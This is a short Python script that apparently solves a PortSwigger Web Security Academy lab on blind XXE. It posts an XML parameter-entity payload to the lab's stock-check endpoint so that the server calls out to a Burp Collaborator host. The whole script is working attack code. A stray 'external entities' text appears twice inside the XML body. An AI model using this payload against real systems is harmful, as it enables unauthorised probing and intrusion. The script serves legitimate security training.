##############################################################################
#
# Lab: Blind XXE with out-of-band interaction via XML parameter entities
#
# Hack Steps: 
#      1. Use a parameter entity to issue a DNS lookup to burp collaborator
#      2. Check your burp collaborator for the DNS lookup
#
##############################################################################
import requests
from colorama import Fore

# Change this to your lab URL
LAB_URL = "https://0a9200da03f5123580b02b2200dd00dd.web-security-academy.net"

# Change this to your burp collaborator
BURP_COLLABORATOR = "020hy3fcc640duqxsjx0an7rtiz9nzbo.oastify.com"

def main():
    print("⦗#⦘ Injection point: " + Fore.YELLOW + "Check stock request")
    print(Fore.WHITE + "❯❯ Using a parameter entity to issue a DNS lookup to burp collaborator.. ", end="", flush=True)

    payload = f"""<?xml version="1.0" encoding="UTF-8"?>
                <!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://{BURP_COLLABORATOR}"> %xxe; ]>
                <stockCheck>
                    <productId>
                        2
                    </productId>
                    <storeId>
                        1
                    </storeId>external entities
                    external entities
                </stockCheck>"""
    headers = { "Content-Type": "application/xml" }

    try:
        requests.post(f"{LAB_URL}/product/stock", data=payload, headers=headers)

    except:
        print(Fore.RED + "⦗!⦘ Failed to check stock with the injected payload through exception")
        exit(1)
        
    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "🗹 Check your burp collaborator for the DNS lookup")
    print(Fore.WHITE + "🗹 The lab should be marked now as " + Fore.GREEN + "solved")

if __name__ == "__main__":
    main()
